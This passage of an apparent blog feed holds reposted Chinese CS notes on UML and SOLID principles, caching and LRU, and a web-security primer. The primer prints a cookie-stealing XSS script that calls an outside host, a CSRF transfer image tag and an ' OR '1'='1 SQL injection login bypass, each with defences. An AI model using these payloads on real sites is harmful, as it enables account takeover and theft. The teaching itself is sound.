punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Music</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Instrument<span class="token operator">></span> instruments <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instruments<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Wind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        instruments<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Percussion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>Instrument instrument <span class="token operator">:</span> instruments<span class="token punctuation">)</span> <span class="token punctuation">{</span>            instrument<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="二、类图"><a href="#二、类图" class="headerlink" title="二、类图"></a>二、类图</h1><p>以下类图使用 <a href="https://www.planttext.com/" target="_blank" rel="noopener">PlantUML</a> 绘制，更多语法及使用请参考：<a href="http://plantuml.com/" target="_blank" rel="noopener">http://plantuml.com/</a> 。</p><h2 id="泛化关系-Generalization"><a href="#泛化关系-Generalization" class="headerlink" title="泛化关系 (Generalization)"></a>泛化关系 (Generalization)</h2><p>用来描述继承关系，在 Java 中使用 extends 关键字。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmJyrBBKh.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmJyrBBKh.png" alt="img"></a></p><pre><code>@startumltitle Generalizationclass Vihicalclass Carclass TrunckVihical &lt;|-- CarVihical &lt;|-- Trunck@enduml</code></pre><h2 id="实现关系-Realization"><a href="#实现关系-Realization" class="headerlink" title="实现关系 (Realization)"></a>实现关系 (Realization)</h2><p>用来实现一个接口，在 Java 中使用 implements 关键字。</p><p>java<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILK8IatCoQn.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILK8IatCoQn.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span>title Realization<span class="token keyword">interface</span> <span class="token class-name">MoveBehavior</span><span class="token keyword">class</span> <span class="token class-name">Fly</span><span class="token keyword">class</span> <span class="token class-name">Run</span>MoveBehavior <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> FlyMoveBehavior <span class="token operator">&lt;</span><span class="token operator">|</span><span class="token punctuation">.</span><span class="token punctuation">.</span> Run<span class="token annotation punctuation">@enduml</span></code></pre><h2 id="聚合关系-Aggregation"><a href="#聚合关系-Aggregation" class="headerlink" title="聚合关系 (Aggregation)"></a>聚合关系 (Aggregation)</h2><p>表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmJ4ylIar.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmJ4ylIar.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span>title Aggregation<span class="token keyword">class</span> <span class="token class-name">Computer</span><span class="token keyword">class</span> <span class="token class-name">Keyboard</span><span class="token keyword">class</span> <span class="token class-name">Mouse</span><span class="token keyword">class</span> <span class="token class-name">Screen</span>Computer o<span class="token operator">--</span> KeyboardComputer o<span class="token operator">--</span> MouseComputer o<span class="token operator">--</span> Screen<span class="token annotation punctuation">@enduml</span></code></pre><h2 id="组合关系-Composition"><a href="#组合关系-Composition" class="headerlink" title="组合关系 (Composition)"></a>组合关系 (Composition)</h2><p>和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmpiyjo2_.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmpiyjo2_.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span>title Composition<span class="token keyword">class</span> <span class="token class-name">Company</span><span class="token keyword">class</span> <span class="token class-name">DepartmentA</span><span class="token keyword">class</span> <span class="token class-name">DepartmentB</span>Company <span class="token operator">*</span><span class="token operator">--</span> DepartmentACompany <span class="token operator">*</span><span class="token operator">--</span> DepartmentB<span class="token annotation punctuation">@enduml</span></code></pre><h2 id="关联关系-Association"><a href="#关联关系-Association" class="headerlink" title="关联关系 (Association)"></a>关联关系 (Association)</h2><p>表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmB2xEJyv.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/SoWkIImgAStDuU8goIp9ILLmB2xEJyv.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span>title Association<span class="token keyword">class</span> <span class="token class-name">School</span><span class="token keyword">class</span> <span class="token class-name">Student</span>School <span class="token string">"1"</span> <span class="token operator">-</span> <span class="token string">"n"</span> Student<span class="token annotation punctuation">@enduml</span></code></pre><h2 id="依赖关系-Dependency"><a href="#依赖关系-Dependency" class="headerlink" title="依赖关系 (Dependency)"></a>依赖关系 (Dependency)</h2><p>和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式：</p><ul><li>A 类是 B 类方法的局部变量；</li><li>A 类是 B 类方法当中的一个参数；</li><li>A 类向 B 类发送消息，从而影响 B 类发生变化。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/LOun2W9134NxVugmbJPp15d4LalxC4O.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/LOun2W9134NxVugmbJPp15d4LalxC4O.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@startuml</span>title Dependency<span class="token keyword">class</span> <span class="token class-name">Vihicle</span> <span class="token punctuation">{</span>    <span class="token function">move</span><span class="token punctuation">(</span>MoveBehavior<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">MoveBehavior</span> <span class="token punctuation">{</span>    <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>note <span class="token string">"MoveBehavior.move()"</span> as NVihicle <span class="token punctuation">.</span><span class="token punctuation">.</span>> MoveBehaviorVihicle <span class="token punctuation">.</span><span class="token punctuation">.</span> N<span class="token annotation punctuation">@enduml</span></code></pre><h1 id="三、设计原则"><a href="#三、设计原则" class="headerlink" title="三、设计原则"></a>三、设计原则</h1><h2 id="S-O-L-I-D"><a href="#S-O-L-I-D" class="headerlink" title="S.O.L.I.D"></a>S.O.L.I.D</h2><table><thead><tr><th>简写</th><th>全拼</th><th>中文翻译</th></tr></thead><tbody><tr><td>SRP</td><td>The Single Responsibility Principle</td><td>单一责任原则</td></tr><tr><td>OCP</td><td>The Open Closed Principle</td><td>开放封闭原则</td></tr><tr><td>LSP</td><td>The Liskov Substitution Principle</td><td>里氏替换原则</td></tr><tr><td>ISP</td><td>The Interface Segregation Principle</td><td>接口分离原则</td></tr><tr><td>DIP</td><td>The Dependency Inversion Principle</td><td>依赖倒置原则</td></tr></tbody></table><h3 id="1-单一责任原则"><a href="#1-单一责任原则" class="headerlink" title="1. 单一责任原则"></a>1. 单一责任原则</h3><blockquote><p>修改一个类的原因应该只有一个。</p></blockquote><p>换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。</p><p>如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。</p><h3 id="2-开放封闭原则"><a href="#2-开放封闭原则" class="headerlink" title="2. 开放封闭原则"></a>2. 开放封闭原则</h3><blockquote><p>类应该对扩展开放，对修改关闭。</p></blockquote><p>扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。</p><p>符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。</p><h3 id="3-里氏替换原则"><a href="#3-里氏替换原则" class="headerlink" title="3. 里氏替换原则"></a>3. 里氏替换原则</h3><blockquote><p>子类对象必须能够替换掉所有父类对象。</p></blockquote><p>继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。</p><p>如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。</p><h3 id="4-接口分离原则"><a href="#4-接口分离原则" class="headerlink" title="4. 接口分离原则"></a>4. 接口分离原则</h3><blockquote><p>不应该强迫客户依赖于它们不用的方法。</p></blockquote><p>因此使用多个专门的接口比使用单一的总接口要好。</p><h3 id="5-依赖倒置原则"><a href="#5-依赖倒置原则" class="headerlink" title="5. 依赖倒置原则"></a>5. 依赖倒置原则</h3><blockquote><p>高层模块不应该依赖于低层模块，二者都应该依赖于抽象；<br>抽象不应该依赖于细节，细节应该依赖于抽象。</p></blockquote><p>高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。</p><p>依赖于抽象意味着：</p><ul><li>任何变量都不应该持有一个指向具体类的指针或者引用；</li><li>任何类都不应该从具体类派生；</li><li>任何方法都不应该覆写它的任何基类中的已经实现的方法。</li></ul><h2 id="其他常见原则"><a href="#其他常见原则" class="headerlink" title="其他常见原则"></a>其他常见原则</h2><p>除了上述的经典原则，在实际开发中还有下面这些常见的设计原则。</p><table><thead><tr><th>简写</th><th>全拼</th><th>中文翻译</th></tr></thead><tbody><tr><td>LOD</td><td>The Law of Demeter</td><td>迪米特法则</td></tr><tr><td>CRP</td><td>The Composite Reuse Principle</td><td>合成复用原则</td></tr><tr><td>CCP</td><td>The Common Closure Principle</td><td>共同封闭原则</td></tr><tr><td>SAP</td><td>The Stable Abstractions Principle</td><td>稳定抽象原则</td></tr><tr><td>SDP</td><td>The Stable Dependencies Principle</td><td>稳定依赖原则</td></tr></tbody></table><h3 id="1-迪米特法则"><a href="#1-迪米特法则" class="headerlink" title="1. 迪米特法则"></a>1. 迪米特法则</h3><p>迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。</p><h3 id="2-合成复用原则"><a href="#2-合成复用原则" class="headerlink" title="2. 合成复用原则"></a>2. 合成复用原则</h3><p>尽量使用对象组合，而不是通过继承来达到复用的目的。</p><h3 id="3-共同封闭原则"><a href="#3-共同封闭原则" class="headerlink" title="3. 共同封闭原则"></a>3. 共同封闭原则</h3><p>一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。</p><h3 id="4-稳定抽象原则"><a href="#4-稳定抽象原则" class="headerlink" title="4. 稳定抽象原则"></a>4. 稳定抽象原则</h3><p>最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。</p><h3 id="5-稳定依赖原则"><a href="#5-稳定依赖原则" class="headerlink" title="5. 稳定依赖原则"></a>5. 稳定依赖原则</h3><p>包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Java 编程思想</li><li>敏捷软件开发：原则、模式与实践</li><li><a href="http://www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html" target="_blank" rel="noopener">面向对象设计的 SOLID 原则</a></li><li><a href="http://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html#generalization" target="_blank" rel="noopener">看懂 UML 类图和时序图</a></li><li><a href="http://www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html" target="_blank" rel="noopener">UML 系列——时序图（顺序图）sequence diagram</a></li><li><a href="http://blog.csdn.net/jianyuerensheng/article/details/51602015" target="_blank" rel="noopener">面向对象编程三大特性 —— 封装、继承、多态</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 面向对象 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面向对象思想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻击技术</title>
      <link href="/2018/12/24/xi-tong-she-ji/gong-ji-ji-zhu/"/>
      <url>/2018/12/24/xi-tong-she-ji/gong-ji-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击技术"><a href="#攻击技术" class="headerlink" title="攻击技术"></a>攻击技术</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%B8%80%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">一、跨站脚本攻击</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%BA%8C%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">二、跨站请求伪造</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E4%B8%89sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">三、SQL 注入攻击</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E5%9B%9B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">四、拒绝服务攻击</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、跨站脚本攻击"><a href="#一、跨站脚本攻击" class="headerlink" title="一、跨站脚本攻击"></a>一、跨站脚本攻击</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><pre><code>&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;</code></pre><p>之后该内容可能会被渲染成以下形式：</p><pre><code>&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;</code></pre><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h2 id="防范手段"><a href="#防范手段" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-设置-Cookie-为-HttpOnly"><a href="#1-设置-Cookie-为-HttpOnly" class="headerlink" title="1. 设置 Cookie 为 HttpOnly"></a>1. 设置 Cookie 为 HttpOnly</h3><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><h3 id="2-过滤特殊字符"><a href="#2-过滤特殊字符" class="headerlink" title="2. 过滤特殊字符"></a>2. 过滤特殊字符</h3><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><pre><code>&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;123&lt;/p&gt;&lt;form&gt;  &lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(/xss/);&lt;/script&gt;&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;123&lt;/p&gt;&amp;lt;form&amp;gt;  &amp;lt;input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt;</code></pre><blockquote><p><a href="http://jsxss.com/zh/try.html" target="_blank" rel="noopener">XSS 过滤在线测试</a></p></blockquote><h1 id="二、跨站请求伪造"><a href="#二、跨站请求伪造" class="headerlink" title="二、跨站请求伪造"></a>二、跨站请求伪造</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><pre><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。</code></pre><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><pre><code>&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。</code></pre><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h2 id="防范手段-1"><a href="#防范手段-1" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-检查-Referer-首部字段"><a href="#1-检查-Referer-首部字段" class="headerlink" title="1. 检查 Referer 首部字段"></a>1. 检查 Referer 首部字段</h3><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h3 id="2-添加校验-Token"><a href="#2-添加校验-Token" class="headerlink" title="2. 添加校验 Token"></a>2. 添加校验 Token</h3><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h3 id="3-输入验证码"><a href="#3-输入验证码" class="headerlink" title="3. 输入验证码"></a>3. 输入验证码</h3><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h1 id="三、SQL-注入攻击"><a href="#三、SQL-注入攻击" class="headerlink" title="三、SQL 注入攻击"></a>三、SQL 注入攻击</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h2 id="攻击原理-2"><a href="#攻击原理-2" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>例如一个网站登录验证的 SQL 查询代码为：</p><pre><code>strSQL = &quot;SELECT * FROM users WHERE (name = &#39;&quot; + userName + &quot;&#39;) and (pw = &#39;&quot;+ passWord +&quot;&#39;);&quot;</code></pre><p>如果填入以下内容：</p><pre><code>userName = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;passWord = &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;;</code></pre><p>那么 SQL 查询字符串为：</p><pre><code>strSQL = &quot;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&quot;</code></pre><p>此时无需验证通过就能执行以下查询：</p><pre><code>strSQL = &quot;SELECT * FROM users;&quot;</code></pre><h2 id="防范手段-2"><a href="#防范手段-2" class="headerlink" title="防范手段"></a>防范手段</h2><h3 id="1-使用参数化查询"><a href="#1-使用参数化查询" class="headerlink" title="1. 使用参数化查询"></a>1. 使用参数化查询</h3><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><pre><code>PreparedStatement stmt = connection.prepareStatement(&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;);stmt.setString(1, userid);stmt.setString(2, password);ResultSet rs = stmt.executeQuery();</code></pre><h3 id="2-单引号转换"><a href="#2-单引号转换" class="headerlink" title="2. 单引号转换"></a>2. 单引号转换</h3><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h1 id="四、拒绝服务攻击"><a href="#四、拒绝服务攻击" class="headerlink" title="四、拒绝服务攻击"></a>四、拒绝服务攻击</h1><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">维基百科：跨站脚本</a></li><li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：SQL 注入攻击</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">维基百科：跨站点请求伪造</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>缓存</title>
      <link href="/2018/12/24/xi-tong-she-ji/huan-cun/"/>
      <url>/2018/12/24/xi-tong-she-ji/huan-cun/</url>
      
        <content type="html"><![CDATA[<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E4%B8%80%E7%BC%93%E5%AD%98%E7%89%B9%E5%BE%81">一、缓存特征</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E4%BA%8Clru">二、LRU</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E4%B8%89%E7%BC%93%E5%AD%98%E4%BD%8D%E7%BD%AE">三、缓存位置</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E5%9B%9Bcdn">四、CDN</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E4%BA%94%E7%BC%93%E5%AD%98%E9%97%AE%E9%A2%98">五、缓存问题</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E5%85%AD%E6%95%B0%E6%8D%AE%E5%88%86%E5%B8%83">六、数据分布</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E4%B8%83%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C">七、一致性哈希</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E7%BC%93%E5%AD%98.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、缓存特征"><a href="#一、缓存特征" class="headerlink" title="一、缓存特征"></a>一、缓存特征</h1><h2 id="命中率"><a href="#命中率" class="headerlink" title="命中率"></a>命中率</h2><p>当某个请求能够通过访问缓存而得到响应时，称为缓存命中。</p><p>缓存命中率越高，缓存的利用率也就越高。</p><h2 id="最大空间"><a href="#最大空间" class="headerlink" title="最大空间"></a>最大空间</h2><p>缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。</p><p>当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。</p><h2 id="淘汰策略"><a href="#淘汰策略" class="headerlink" title="淘汰策略"></a>淘汰策略</h2><ul><li>FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。</li><li>LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。</li></ul><h1 id="二、LRU"><a href="#二、LRU" class="headerlink" title="二、LRU"></a>二、LRU</h1><p>以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下：</p><ul><li>访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。</li><li>为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。</li></ul><pre><code>public class LRU&lt;K, V&gt; implements Iterable&lt;K&gt; {    private Node head;    private Node tail;    private HashMap&lt;K, Node&gt; map;    private int maxSize;    private class Node {        Node pre;        Node next;        K k;        V v;        public Node(K k, V v) {            this.k = k;            this.v = v;        }    }    public LRU(int maxSize) {        this.maxSize = maxSize;        this.map = new HashMap&lt;&gt;(maxSize * 4 / 3);        head = new 